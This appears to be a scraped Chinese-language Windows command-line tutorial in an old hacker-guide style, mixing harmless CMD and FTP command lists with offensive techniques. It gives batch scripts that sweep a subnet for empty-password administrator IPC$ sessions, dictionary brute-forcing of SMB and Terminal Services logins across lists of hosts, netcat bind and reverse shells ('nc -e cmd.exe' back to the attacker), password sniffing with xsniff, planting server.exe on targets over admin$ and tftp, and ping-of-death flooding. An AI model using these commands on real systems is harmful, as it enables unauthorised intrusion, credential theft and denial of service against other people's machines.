}。</p>\n<p>　　用法举例：</p>\n<p>　　@echo off</p>\n<p>　　echo 用法格式：test.bat <em>.</em>.* &gt; test.txt</p>\n<p>　　for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt</p>\n<p>　　存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。</p>\n<p>　　/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：<em>.</em>.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。</p>\n<p>　　@echo off</p>\n<p>　　echo 用法格式：ok.bat ip</p>\n<p>　　FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200</p>\n<p>　　存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。</p>\n<p>　　七：</p>\n<p>　　2：if命令及变量 基本格式</p>\n<p>　　IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。</p>\n<p>　　例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。</p>\n<p>　　0 指发现并成功执行（真）；1 指没有发现、没执行（假）。</p>\n<p>　　IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。</p>\n<p>　　例：“if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）</p>\n<p>　　IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。</p>\n<p>　　例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。</p>\n<p>　　IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”</del></p>\n<p>　　系统外部命令</p>\n<p>　　注：系统外部命令(均需下载相关工具)</p>\n<p>　　瑞士军刀：nc.exe</p>\n<p>　　参数说明：</p>\n<p>　　-h 查看帮助信息</p>\n<p>　　-d 后台模式</p>\n<p>　　-e prog程序重定向，一但连接就执行[危险]</p>\n<p>　　-i secs延时的间隔</p>\n<p>　　-l 监听模式，用于入站连接</p>\n<p>　　-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</p>\n<p>　　-n IP地址，不能用域名</p>\n<p>　　-o film记录16进制的传输</p>\n<p>　　-p[空格]端口 本地端口号</p>\n<p>　　-r 随机本地及远程端口</p>\n<p>　　-t 使用Telnet交互方式</p>\n<p>　　-u UDP模式</p>\n<p>　　-v 详细输出，用-vv将更详细</p>\n<p>　　-w数字 timeout延时间隔</p>\n<p>　　-z 将输入，输出关掉（用于扫锚时）</p>\n<p>　　基本用法：</p>\n<p>　　nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口</p>\n<p>　　nc -l -p 80 开启本机的TCP 80端口并监听</p>\n<p>　　nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口</p>\n<p>　　nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口</p>\n<p>　　nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口</p>\n<p>　　高级用法：</p>\n<p>　　nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</p>\n<p>　　nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt</p>\n<p>　　nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</p>\n<p>　　type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用</p>\n<p>　　本机上用：nc -l -p 本机端口</p>\n<p>　　在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K</p>\n<p>　　nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙</p>\n<p>　　本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</p>\n<p>　　在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机</p>\n<p>　　备 注：</p>\n<p>　　| 管道命令</p>\n<p>　　&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令</p>\n<p>　　@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中</p>\n<p>　　&gt;与&gt;&gt;的区别 “&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。</p>\n<p>　　如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p>\n<p>　　八：</p>\n<p>　　扫描工具：xscan.exe</p>\n<p>　　基本格式</p>\n<p>　　xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息</p>\n<p>　　xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息</p>\n<p>　　检测项目</p>\n<p>　　-active 检测主机是否存活</p>\n<p>　　-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）</p>\n<p>　　-port 检测常用服务的端口状态</p>\n<p>　　-ftp 检测FTP弱口令</p>\n<p>　　-pub 检测FTP服务匿名用户写权限</p>\n<p>　　-pop3 检测POP3-Server弱口令</p>\n<p>　　-smtp 检测SMTP-Server漏洞</p>\n<p>　　-sql 检测SQL-Server弱口令</p>\n<p>　　-smb 检测NT-Server弱口令</p>\n<p>　　-iis 检测IIS编码/解码漏洞</p>\n<p>　　-cgi 检测CGI漏洞</p>\n<p>　　-nasl 加载Nessus攻击脚本</p>\n<p>　　-all 检测以上所有项目</p>\n<p>　　其它选项</p>\n<p>　　-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取</p>\n<p>　　-l 显示所有网络适配器</p>\n<p>　　-v 显示详细扫描进度</p>\n<p>　　-p 跳过没有响应的主机</p>\n<p>　　-o 跳过没有检测到开放端口的主机</p>\n<p>　　-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10</p>\n<p>　　-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)</p>\n<p>　　用法示例</p>\n<p>　　xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机</p>\n<p>　　xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机</p>\n<p>　　xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机</p>\n<p>　　九：</p>\n<p>　　命令行方式嗅探器: xsniff.exe</p>\n<p>　　可捕获局域网内FTP/SMTP/POP3/HTTP协议密码</p>\n<p>　　参数说明</p>\n<p>　　-tcp 输出TCP数据报</p>\n<p>　　-udp 输出UDP数据报</p>\n<p>　　-icmp 输出ICMP数据报</p>\n<p>　　-pass 过滤密码信息</p>\n<p>　　-hide 后台运行</p>\n<p>　　-host 解析主机名</p>\n<p>　　-addr IP地址 过滤IP地址</p>\n<p>　　-port 端口 过滤端口</p>\n<p>　　-log 文件名 将输出保存到文件</p>\n<p>　　-asc 以ASCII形式输出</p>\n<p>　　-hex 以16进制形式输出</p>\n<p>　　用法示例</p>\n<p>　　xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中</p>\n<p>　　xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出</p>\n<p>　　终端服务密码破解: tscrack.exe</p>\n<p>　　参数说明</p>\n<p>　　-h 显示使用帮助</p>\n<p>　　-v 显示版本信息</p>\n<p>　　-s 在屏幕上打出解密能力</p>\n<p>　　-b 密码错误时发出的声音</p>\n<p>　　-t 同是发出多个连接（多线程）</p>\n<p>　　-N Prevent System Log entries on targeted server</p>\n<p>　　-U 卸载移除tscrack组件</p>\n<p>　　-f 使用－f后面的密码</p>\n<p>　　-F 间隔时间（频率）</p>\n<p>　　-l 使用－l后面的用户名</p>\n<p>　　-w 使用－w后面的密码字典</p>\n<p>　　-p 使用－p后面的密码</p>\n<p>　　-D 登录主页面</p>\n<p>　　用法示例</p>\n<p>　　tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码</p>\n<p>　　tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户</p>\n<p>　　@if not exist ipcscan.txt goto noscan</p>\n<p>　　@for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%i</p>\n<p>　　nscan</p>\n<p>　　@echo 3389.txt no find or scan faild</p>\n<p>　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)</p>\n<p>　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat</p>\n<p>　　@if not exist tscrack.exe goto noscan</p>\n<p>　　@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt</p>\n<p>　　:noscan</p>\n<p>　　@echo tscrack.exe no find or scan faild</p>\n<p>　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)</p>\n<p>　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。</p>\n<p>　　其它</p>\n<p>　　Shutdown.exe</p>\n<p>　　Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）</p>\n<p>　　fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）</p>\n<p>　　fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息</p>\n<p>　　Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。</p>\n<p>　　OpenTelnet.exe (远程开启telnet工具)</p>\n<p>　　opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。</p>\n<p>　　NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。</p>\n<p>　　ResumeTelnet.exe (OpenTelnet附带的另一个工具)</p>\n<p>　　resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。</p>\n<p>　　FTP命令详解</p>\n<p>　　FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。</p>\n<p>　　FTP的命令行格式为：</p>\n<p>　　ftp -v -d -i -n -g [主机名] ，其中</p>\n<p>　　-v 显示远程服务器的所有响应信息</p>\n<p>　　-n 限制ftp的自动登录，即不使用；.n etrc文件；</p>\n<p>　　-d 使用调试方式；</p>\n<p>　　-g 取消全局文件名。</p>\n<p>　　FTP使用的内部命令如下(中括号表示可选项):</p>\n<p>　　1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip</p>\n<p>　　2.$ macro-ame[args]： 执行宏定义macro-name。</p>\n<p>　　3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。</p>\n<p>　　4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</p>\n<p>　　5.ascii：使用ascii类型传输方式。</p>\n<p>　　6.bell：每个命令执行完毕后计算机响铃一次。</p>\n<p>　　7.bin：使用二进制文件传输方式。</p>\n<p>　　8.bye：退出ftp会话过程。</p>\n<p>　　9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。</p>\n<p>　　10. cd remote-dir：进入远程主机目录。</p>\n<p>　　11.cdup：进入远程主机目录的父目录。</p>\n<p>　　12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</p>\n<p>　　13.close：中断与远程服务器的ftp会话(与open对应)。</p>\n<p>　　14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。</p>\n<p>　　15.delete remote-file：删除远程主机文件。</p>\n<p>　　16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</p>\n<p>　　17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</p>\n<p>　　18.disconnection：同close。</p>\n<p>　　19.form format：将文件传输方式设置为format，缺省为file方式。</p>\n<p>　　20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。</p>\n<p>　　21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</p>\n<p>　　22.hash：每传输1024字节，显示一个hash符号(#)。</p>\n<p>　　23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</p>\n<p>　　24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</p>\n<p>　　25.image：设置二进制传输方式(同binary)。</p>\n<p>　　26.lcd[dir]：将本地工作目录切换至dir。</p>\n<p>　　27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。</p>\n<p>　　28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</p>\n<p>　　29.mdelete[remote-file]：删除远程主机文件。</p>\n<p>　　30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir <em>.o.</em>.zipoutfile 。</p>\n<p>　　31.mget remote-files：传输多个远程文件。</p>\n<p>　　32.mkdir dir-name：在远程主机中建一目录。</p>\n<p>　　33.mls remote-file local-file：同nlist，但可指定多个文件名。</p>\n<p>　　34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</p>\n<p>　　35.modtime file-name：显示远程主机文件的最后修改时间。</p>\n<p>　　36.mput local-file：将多个文件传输至远程主机。</p>\n<p>　　37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</p>\n<p>　　38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</p>\n<p>　　39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。</p>\n<p>　　40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</p>\n<p>　　41.open host[port]：建立指定ftp服务器连接，可指定连接端口。</p>\n<p>　　42.passive：进入被动传输方式。</p>\n<p>　　43.prompt：设置多个文件传输时的交互提示。</p>\n<p>　　44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</p>\n<p>　　45.put local-file[remote-file]：将本地文件local-file传送至远程主机。</p>\n<p>　　46.pwd：显示远程主机的当前工作目录。</p>\n<p>　　47.quit：同bye，退出ftp会话。</p>\n<p>　　48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.</p>\n<p>　　49.recv remote-file[local-file]：同get。</p>\n<p>　　50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</p>\n<p>　　51.rhelp[cmd-name]：请求获得远程主机的帮助。</p>\n<p>　　52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</p>\n<p>　　53.rename[from][to]：更改远程主机文件名。</p>\n<p>　　54.reset：清除回答队列。</p>\n<p>　　55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。</p>\n<p>　　56.rmdir dir-name：删除远程主机目录。</p>\n<p>　　57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</p>\n<p>　　58.send local-file[remote-file]：同put。</p>\n<p>　　59.sendport：设置PORT命令的使用。</p>\n<p>　　60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。</p>\n<p>　　61.size file-name：显示远程主机文件大小，如：site idle 7200。</p>\n<p>　　62.status：显示当前ftp状态。</p>\n<p>　　63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。</p>\n<p>　　64.sunique：将远程主机文件名存储设置为只一(与runique对应)。</p>\n<p>　　65.system：显示远程主机的操作系统类型。</p>\n<p>　　66.tenex：将文件传输类型设置为TENEX机的所需的类型。</p>\n<p>　　67.tick：设置传输时的字节计数器。</p>\n<p>　　68.trace：设置包跟踪。</p>\n<p>　　69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。</p>\n<p>　　70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</p>\n<p>　　71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</p>\n<p>　　72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</p>\n<p>　　73.?[cmd]：同help.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>运行操作</p>\n<p>CMD命令：开始－&gt;运行－&gt;键入cmd或command(在命令行里可以看到系统版本、文件系统版本)</p>\n<p>CMD命令锦集</p>\n<ol>\n<li>gpedit.msc—–组策略</li>\n</ol>\n<p>　　2. sndrec32——-录音机</p>\n<p>　　3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。</p>\n<p>　　4. explorer——-打开资源管理器</p>\n<p>　　5. logoff———注销命令</p>\n<p>　　6. shutdown——-60秒倒计时关机命令</p>\n<p>　　7. lusrmgr.msc—-本机用户和组</p>\n<p>　　8. services.msc—本地服务设置</p>\n<p>　　9. oobe/msoobe /a—-检查XP是否激活</p>\n<p>　　10. notepad——–打开记事本</p>\n<p>　　11. cleanmgr——-垃圾整理</p>\n<p>　　12. net start messenger—-开始信使服务</p>\n<p>　　13. compmgmt.msc—计算机管理</p>\n<p>　　14. net stop messenger—–停止信使服务</p>\n<p>　　15. conf———–启动netmeeting</p>\n<p>　　16. dvdplay——–DVD播放器</p>\n<p>　　17. charmap——–启动字符映射表</p>\n<p>　　18. diskmgmt.msc—磁盘管理实用程序</p>\n<p>　　19. calc———–启动计算器</p>\n<p>　　20. dfrg.msc——-磁盘碎片整理程序</p>\n<p>　　21. chkdsk.exe—–Chkdsk磁盘检查</p>\n<p>　　22. devmgmt.msc— 设备管理器</p>\n<p>　　23. regsvr32 /u *.dll—-停止dll文件运行</p>\n<p>　　24. drwtsn32—— 系统医生</p>\n<p>　　25. rononce -p—-15秒关机</p>\n<p>　　26. dxdiag———检查DirectX信息</p>\n<p>　　27. regedt32——-注册表编辑器</p>\n<p>　　28. Msconfig.exe—系统配置实用程序</p>\n<p>　　29. rsop.msc——-组策略结果集</p>\n<p>　　30. mem.exe——–显示内存使用情况</p>\n<p>　　31. regedit.exe—-注册表</p>\n<p>　　32. winchat——–XP自带局域网聊天</p>\n<p>　　33. progman——–程序管理器</p>\n<p>　　34. winmsd———系统信息</p>\n<p>　　35. perfmon.msc—-计算机性能监测程序</p>\n<p>　　36. winver———检查Windows版本</p>\n<p>　　37. sfc /scannow—–扫描错误并复原</p>\n<p>　　38. taskmgr—–任务管理器（2000/xp/2003</p>\n<p>　　40. wmimgmt.msc—-打开windows管理体系结构(WMI)</p>\n<p>　　41. wupdmgr——–windows更新程序</p>\n<p>　　42. wscript——–windows脚本宿主设置</p>\n<p>　　43. write———-写字板</p>\n<p>　　45. wiaacmgr——-扫描仪和照相机向导</p>\n<p>　　46. winchat——–XP自带局域网聊天</p>\n<p>　　49. mplayer2——-简易widnows media player</p>\n<p>　　50. mspaint——–画图板</p>\n<p>　　51. mstsc———-远程桌面连接</p>\n<p>　　53. magnify——–放大镜实用程序</p>\n<p>　　54. mmc————打开控制台</p>\n<p>　　55. mobsync——–同步命令</p>\n<p>　　57. iexpress——-木马捆绑工具，系统自带</p>\n<p>　　58. fsmgmt.msc—–共享文件夹管理器</p>\n<p>　　59. utilman——–辅助工具管理器</p>\n<p>　　61. dcomcnfg——-打开系统组件服务</p>\n<p>　　62. ddeshare——-打开DDE共享设置</p>\n<p>　　110. osk————打开屏幕键盘</p>\n<p>　　111. odbcad32——-ODBC数据源管理器</p>\n<p>　　112. oobe/msoobe /a—-检查XP是否激活</p>\n<p>　　68. ntbackup——-系统备份和还原</p>\n<p>　　69. narrator——-屏幕“讲述人”</p>\n<p>　　70. ntmsmgr.msc—-移动存储管理器</p>\n<p>　　71. ntmsoprq.msc—移动存储管理员操作请求</p>\n<p>　　72. netstat -an—-(TC)命令检查接口</p>\n<p>　　73. syncapp——–创建一个公文包</p>\n<p>　　74. sysedit——–系统配置编辑器</p>\n<p>　　75. sigverif——-文件签名验证程序</p>\n<p>　　76. ciadv.msc——索引服务程序</p>\n<p>　　77. shrpubw——–创建共享文件夹</p>\n<p>　　78. secpol.msc—–本地安全策略</p>\n<p>　　79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</p>\n<p>　　80. services.msc—本地服务设置</p>\n<p>　　81. Sndvol32——-音量控制程序</p>\n<p>　　82. sfc.exe——–系统文件检查器</p>\n<p>　　83. sfc /scannow—windows文件保护</p>\n<p>　　84. ciadv.msc——索引服务程序</p>\n<p>　　85. tourstart——xp简介（安装完成后出现的漫游xp程序）</p>\n<p>　　86. taskmgr——–任务管理器</p>\n<p>　　87. eventvwr——-事件查看器</p>\n<p>　　88. eudcedit——-造字程序</p>\n<p>　　89. compmgmt.msc—计算机管理</p>\n<p>　　90. packager——-对象包装程序</p>\n<p>　　91. perfmon.msc—-计算机性能监测程序</p>\n<p>　　92. charmap——–启动字符映射表</p>\n<p>　　93. cliconfg——-SQL SERVER 客户端网络实用程序</p>\n<p>　　94. Clipbrd——–剪贴板查看器</p>\n<p>　　95. conf———–启动netmeeting</p>\n<p>　　96. certmgr.msc—-证书管理实用程序</p>\n<p>　　97. regsvr32 /u *.dll—-停止dll文件运行</p>\n<p>　　98. regsvr32 /u zipfldr.dll——取消ZIP支持</p>\n<p>　　99. cmd.exe——–CMD命令提示符</p>\n<p>操作详解　　</p>\n<p>net use ipipc$ “ “ /user:” “ 建立IPC空链接</p>\n<p>　　net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接</p>\n<p>　　net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:</p>\n<p>　　net use h: ipc$ 登陆后映射对方C：到本地为H:</p>\n<p>　　net use ipipc$ /del 删除IPC链接</p>\n<p>　　net use h: /del 删除映射对方到本地的为H:的映射</p>\n<p>　　net user 用户名　密码　/add 建立用户</p>\n<p>　　net user guest /active:yes 激活guest用户</p>\n<p>　　net user 查看有哪些用户</p>\n<p>　　net user 帐户名 查看帐户的属性</p>\n<p>　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限</p>\n<p>　　net start 查看开启了哪些服务</p>\n<p>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)</p>\n<p>　　net stop 服务名 停止某服务</p>\n<p>　　net time 目标ip 查看对方时间</p>\n<p>　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</p>\n<p>　　net view 查看本地局域网内开启了哪些共享</p>\n<p>　　net view ip 查看对方局域网内开启了哪些共享</p>\n<p>　　net config 显示系统网络设置</p>\n<p>　　net logoff 断开连接的共享</p>\n<p>　　net pause 服务名 暂停某服务</p>\n<p>　　net send ip “文本信息” 向对方发信息</p>\n<p>　　net ver 局域网内正在使用的网络连接类型和信息</p>\n<p>　　net share 查看本地开启的共享</p>\n<p>　　net share ipc$ 开启ipc$共享</p>\n<p>　　net share ipc$ /del 删除ipc$共享</p>\n<p>　　net share c$ /del 删除C：共享</p>\n<p>　　net user guest 12345 用guest用户登陆后用将密码改为12345</p>\n<p>　　net password 密码 更改系统登陆密码</p>\n<p>　　netstat -a 查看开启了哪些端口,常用netstat -an</p>\n<p>　　netstat -n 查看端口的网络连接情况，常用netstat -an</p>\n<p>　　netstat -v 查看正在进行的工作</p>\n<p>　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</p>\n<p>　　netstat -s 查看正在使用的所有协议使用情况</p>\n<p>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p>\n<p>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p>\n<p>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p>\n<p>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p>\n<p>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息</p>\n<p>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>\n<p>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>\n<p>　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件</p>\n<p>　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p>\n<p>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</p>\n<p>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令</p>\n<p>　　at id号 开启已注册的某个计划任务</p>\n<p>　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</p>\n<p>　　at id号 /delete 停止某个已注册的计划任务</p>\n<p>　　at 查看所有的计划任务</p>\n<p>　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机</p>\n<p>　　finger username @host 查看最近有哪些用户登陆</p>\n<p>　　telnet ip 端口 远和登陆服务器,默认端口为23</p>\n<p>　　open ip 连接到IP（属telnet登陆后的命令）</p>\n<p>　　telnet 在本机上直接键入telnet 将进入本机的telnet</p>\n<p>　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</p>\n<p>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p>\n<p>　　copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</p>\n<p>　　copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p>\n<p>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件</p>\n<p>　　用参数/e才可连目录下的子目录一起复制到目标地址下。</p>\n<p>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p>\n<p>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p>\n<p>　　ftp 